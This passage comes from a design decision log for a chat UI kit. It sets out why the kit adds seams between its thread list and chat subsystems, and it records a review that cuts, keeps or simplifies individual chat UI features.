**Why.** An enterprise app that runs its conversation on OpenUI may not move it to the kit. It can
still show its threads and the chrome around them in Hoist, with the kit's thread list and its
model whole, and a small chat model that delegates to OpenUI. The thread list is generic UI that
users know well. Seams between subsystems give that kind of app a real path. Interfaces inside a
subsystem gave none: `ChatMessageListHost` mirrored `ChatModel` with about 25 optional members and
no second implementer (D82).

**Next.** Build both seams when that app or another is ready to use them. Today's cuts already
shrink the threads-to-chat contract, as paging and the one-reply-at-a-time setting leave.

**Alternatives.** Keep `ChatThreadListHost`, so an app writes its own threads model behind the
kit's list. The app would rebuild backend loading, optimistic rename and delete, routing and
recency groups for each use.

## D90. The chat UI layer is cut back to its consumers

**Decision.** Anselm walked review 7 (`planning/reviews/review-7-chat-ui-layer.md`) and made a call
on each feature of the chat UI layer. The review holds the full tables. In short:

- **Cut:** pins, thread list paging and history paging, `allowConcurrentTurns`, the restore of the
  selected thread after a reload, `dataRefreshedAt`, `shortcuts.toggleDock`, the composer pill's
  `status` and `readonly`, feedback `reasons` and comments on a thumbs up, `ChatThreadListHost`
  (D89), and the thread create call. A transport for a backend that mints thread ids creates the
  thread on its first request and reports the id on `RUN_STARTED` (D39). Citation ranges, web
  citation pinning and source favicons go too.
- **Kept, with changes:** the deep link `route`, with the missing "not found" view built. The
  markdown table cap, with a configurable limit that defaults to 100 rows. Citation grouping,
  labeled "N sources" when the numbers are not consecutive. "Ended early" thread rows, which the
  kit also sets from its own chats. Local drafts, cleared when their thread is deleted.
- **Simplified:** the workspace keeps one saved width per panel. `ChatToolDisplay` folds `answer`
  into `inline`.
- **Kept as built:** the side panel, the status vocabulary and the shortcuts.

The design reconciliation changes to match: R5, R9 and H7 change, R14 is built, and B3 and B6
settle as built.

**Why.** Much of the layer came from a design brief that aimed at every use case at once, and from
two apps that will not adopt the kit. A feature stays if a consumer in hand needs it or if it
shows the direction of chat UI. When the conversation model already holds a state, the UI that
shows it is cheap, so it stays.
